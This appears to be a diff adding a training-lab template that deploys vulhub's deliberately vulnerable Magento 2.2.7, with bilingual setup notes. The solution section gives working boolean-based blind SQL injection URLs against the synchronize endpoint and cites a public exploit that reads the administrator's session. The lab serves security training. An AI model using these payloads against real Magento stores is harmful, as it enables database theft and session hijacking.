@@ -1,0 +1,102 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-magento-2-2-sqli
+  name: Magento 2.2 SQL Injection
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - magento
+  description: Magento — Magento 2.2 SQL Injection (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - cms
+    - magento
+    - sql-injection
+    difficulty: medium
+    summary: Magento 2.2 SQL Injection
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli
+        Magento is a professional open-source e-commerce platform developed in PHP using the Zend Framework. It is designed to be highly flexible with a modular architecture and rich functionality.
+        A bug exists in its `prepareSqlCondition` function where a second string formatting introduces an unexpected single quote, leading to an SQL injection vulnerability.
+        References:
+        - https://www.ambionics.io/blog/magento-sqli
+        - https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html
+        # Environment Setup
+        Execute the following command to start Magento 2.2.7:
+        $ docker compose up -d
+        After the server starts, visit `http://your-ip:8080` to see the Magento installation page. During installation, set the database address to `mysql`, username and password both as `root`, and keep other settings as default:
+        # Vulnerability Reproduction
+        Visit the following links:
+        - `http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-`
+        - `http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-`
+        You can see that when executing `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -` and `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`, the returned HTTP status codes are different:
+        By changing the OR condition, you can perform SQL boolean-based blind injection.
+        Using this POC (https://github.com/ambionics/magento-exploits), you can read the administrator's session:
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/magento/2.2-sqli
+        Magento is a professional open-source e-commerce platform developed in PHP using the Zend Framework. It is designed to be highly flexible with a modular architecture and rich functionality.
+        A bug exists in its `prepareSqlCondition` function where a second string formatting introduces an unexpected single quote, leading to an SQL injection vulnerability.
+        References:
+        - https://www.ambionics.io/blog/magento-sqli
+        - https://devdocs.magento.com/guides/v2.2/release-notes/ReleaseNotes2.2.8CE.html
+        # Environment Setup
+        Execute the following command to start Magento 2.2.7:
+        $ docker compose up -d
+        After the server starts, visit `http://your-ip:8080` to see the Magento installation page. During installation, set the database address to `mysql`, username and password both as `root`, and keep other settings as default:
+        # Vulnerability Reproduction
+        Visit the following links:
+        - `http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-`
+        - `http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-`
+        You can see that when executing `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=1) -- -` and `))) OR (SELECT 1 UNION SELECT 2 FROM DUAL WHERE 1=0) -- -`, the returned HTTP status codes are different:
+        By changing the OR condition, you can perform SQL boolean-based blind injection.
+        Using this POC (https://github.com/ambionics/magento-exploits), you can read the administrator's session:
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_80
+    group:
+      fr: Accès
+      en: Access
+    label: web 80/tcp
+    type: port
+    default: 8080
+services:
+  web:
+    role: main
+    image: vulhub/magento
+    tag: 2.2.7@sha256:920f0dd512a25de1992cd444d3edc56e6131f840e65ae1ba3262aa276ed5304e
+    frozen: true
+    depends_on:
+    - mysql
+    ports:
+    - container: 80
+      host: '{{ form.port_80 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+  mysql:
+    role: database
+    image: mysql
+    tag: 5.7@sha256:4bc6bc963e6d8443453676cae56536f4b8156d78bae03c0145cbe47c2aad73bb
+    frozen: true
+    env:
+      MYSQL_ROOT_PASSWORD: root
+      MYSQL_DATABASE: magento
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_80 }}
